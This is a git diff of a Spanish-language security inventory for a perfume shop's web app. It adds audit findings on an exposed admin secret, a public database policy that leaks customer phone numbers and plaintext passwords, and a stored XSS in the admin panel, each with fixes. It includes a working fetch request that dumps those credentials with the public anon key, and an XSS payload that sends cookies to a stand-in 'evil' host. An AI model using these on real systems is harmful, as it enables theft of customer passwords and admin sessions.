@@ -1,6 +1,6 @@
 # SECURITY.md — Inventario de seguridad de ST Perfumería
 
-> **Última actualización:** Mayo 21, 2026 (madrugada · post Plan B Supabase).
+> **Última actualización:** Junio 27, 2026 (sábado · 2 hallazgos nuevos + verificación de S1 durante el test de `[FORGOT-PASS-A]` · ver nota en S1, addendum de S2 y el nuevo S10). Previa: Mayo 21, 2026 (post Plan B Supabase).
 > **Estado general:** ⚠️ **Hay vulnerabilidades CRÍTICAS pendientes de fix.** Este documento es el ground truth de qué sabemos sobre seguridad del proyecto, qué está roto, qué está OK, y qué planeamos arreglar.
 >
 > **Audiencia:** Alejo + Claude Code de próximas sesiones. Cuando arranque la sesión `[SECURITY-AUDIT-S1]`, **leer este archivo primero.**
@@ -35,6 +35,13 @@
 
 **Por qué se hizo así originalmente (probable):**
 Antes que existiera Supabase Auth, el admin se protegía con un check JS simple (`if (pass === ADMIN_PASS)`). Cuando se migró a Supabase Auth, las constantes quedaron olvidadas. **Hoy las usa el flow nuevo? Hay que verificar:** mirar referencias a `ADMIN_PASS` en el código y ver si todavía se compara con el input del usuario.
+
+**✅ Verificado 27-jun-2026 (durante el test de `[FORGOT-PASS-A]`):**
+- Las líneas reales hoy son **L2778-2779** (no L2766-2767 · el archivo creció).
+- **El login del admin YA NO usa estas constantes** · autentica contra Supabase Auth (`sb.auth.signInWithPassword`). El comentario en `admin.html` L2775-2777 lo confirma → **no es un login-bypass.**
+- **`ADMIN_PASS_EMPLEADO` es código MUERTO** · sólo se declara, nunca se referencia → se puede borrar sin riesgo.
+- **`ADMIN_PASS` SIGUE VIVO** · se usa como secreto compartido para llamar a `/api/send-notification` (`admin.html` L7229, validado server-side en Vercel). Al estar en JS público, cualquiera lo lee y puede mandar **push spam a todos los suscriptores**. Borrarlo NO es one-liner: hay que cambiar la auth del endpoint (validar la sesión de Supabase server-side en lugar del string estático) + rotar el secreto en Vercel.
+- **Re-scoping de S1:** ya no es "robo de login del panel"; es (a) borrar la var muerta + (b) reemplazar el secreto del push por auth de sesión. Severidad efectiva 🔴→🟠, pero sigue siendo real.
 
 **Fix recomendado (sin tirar pelota nueva):**
 1. Eliminar completamente las constantes `ADMIN_PASS` y `ADMIN_PASS_EMPLEADO` del HTML
@@ -72,6 +79,21 @@ Antes que existiera Supabase Auth, el admin se protegía con un check JS simple 
 - Implementar lazy migration: cuando un cliente hace login con su password en plano, el server (función SQL) hashea con bcrypt y reemplaza el valor en la columna. La próxima vez compara hash.
 - Tras 6 meses, los clientes activos ya están migrados. Los inactivos pueden forzarse via reset.
 - Esto está documentado como pendiente desde hace meses. Hoy SIGUE siendo crítico.
+
+**⚠️ Exploitabilidad directa (hallado 27-jun-2026 · agrava S2):**
+La tabla `clientes` tiene una policy `SELECT` para el rol `public` con `USING (true)` (policy "Leer clientes"). Como la **anon key vive en el JS público** (`js/app.js` / `admin.html`), cualquiera puede hacer hoy mismo, sin loguearse:
+
+```js
+fetch(SUPABASE_URL + '/rest/v1/clientes?select=telefono,password', {
+  headers: { apikey: ANON_KEY, Authorization: 'Bearer ' + ANON_KEY }
+})
+```
+
+y bajarse **TODOS los teléfonos + contraseñas en plano** de los clientes. No hace falta el dump ni acceso al dashboard · la anon key de **producción** alcanza. Esto convierte a S2 en explotable de forma remota y trivial, no sólo "si alguien accede a la BD".
+
+**Por qué no se puede apretar la RLS a secas:** el login del cliente (`js/app.js`) lee `clientes` como `anon` para comparar la pass. Cerrar el `SELECT` público **rompe el login** hasta migrar a Supabase Auth + bcrypt. Por eso el fix va atado a `[BCRYPT-MIGRATION]`, no es un cambio de policy aislado.
+
+**Mitigación posible sin romper login:** mover la verificación de pass a una función `SECURITY DEFINER` (RPC) que reciba `telefono`+`pass` y devuelva sólo un booleano; entonces el `SELECT password` deja de necesitar estar abierto a anon y la policy puede restringir columnas/filas.
 
 ---
 
@@ -175,6 +197,31 @@ Antes que existiera Supabase Auth, el admin se protegía con un check JS simple 
 
 ---
 
+### **S10 · Stored XSS · nombre de cliente sin escapar en el panel admin**
+
+**Severidad:** 🟡 ALTA · hallado 27-jun-2026 durante el test de `[FORGOT-PASS-A]`.
+
+**Dónde está:**
+- `admin.html` (~L3900) · la tab "Clientes" (`renderClients`) inyecta `c.nombre` directo vía `innerHTML` sin escapar:
+  ```js
+  + '<div class="client-name">...' + c.nombre + blockedBadge + '</div>'
+  ```
+- Probablemente otros campos de texto libre del cliente (`c.nota`, `c.telefono2`) comparten el patrón.
+
+**Cómo explotarlo:**
+1. Un atacante se registra en el sitio público (signup abierto) con un nombre tipo `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`.
+2. Cuando la chica (jefe o empleada) abre la tab "Clientes" en el panel, ese HTML se ejecuta **en su sesión admin autenticada**.
+3. El payload puede robar tokens de sesión de Supabase, ejecutar acciones admin, exfiltrar datos de los clientes, etc.
+
+**Impacto:** ejecución de JS arbitrario en el contexto del panel admin → escalada efectiva a "cualquier cosa que la chica puede hacer".
+
+**Fix recomendado:**
+- Escapar TODO texto libre del cliente antes de inyectarlo (`escapeHtml()` ya existe en `admin.html`, L7212). Aplicar en `renderClients` a `nombre`, `nota` y cualquier campo editable por el cliente.
+- Auditar TODOS los `innerHTML` del panel que mezclen datos de usuario.
+- ✅ En el código nuevo de "Pedidos pass" (commit `eefdfe9`) el nombre YA se escapa · este issue es para los lugares preexistentes.
+
+---
+
 ## 🟢 Issues MEDIOS · revisar pero no urgente
 
 ### **S7 · admin.html accesible públicamente · cualquiera puede llegar al login**
@@ -237,7 +284,7 @@ Antes que existiera Supabase Auth, el admin se protegía con un check JS simple 
 | Cosa | Estado |
 |---|---|
 | Auth de admin via Supabase Auth | ✓ Funciona post Plan B (hashes bcrypt preservados) |
-| RLS pública en tablas (`select_public USING true`) | ✓ Configurado en las 28 tablas de public |
+| RLS pública en tablas (`select_public USING true`) | ⚠️ Configurado en las 28 tablas · OK para el catálogo, **pero en `clientes` filtra teléfonos + passwords en plano a `anon`** (ver addendum de S2) · NO es "OK" para esa tabla |
 | RLS escritura `auth.role() = 'authenticated'` | ✓ Configurado |
 | Service role keys NO en frontend | ✓ Solo en env vars o `.env` local (borrado) |
 | HTTPS en producción | ✓ Vercel auto |
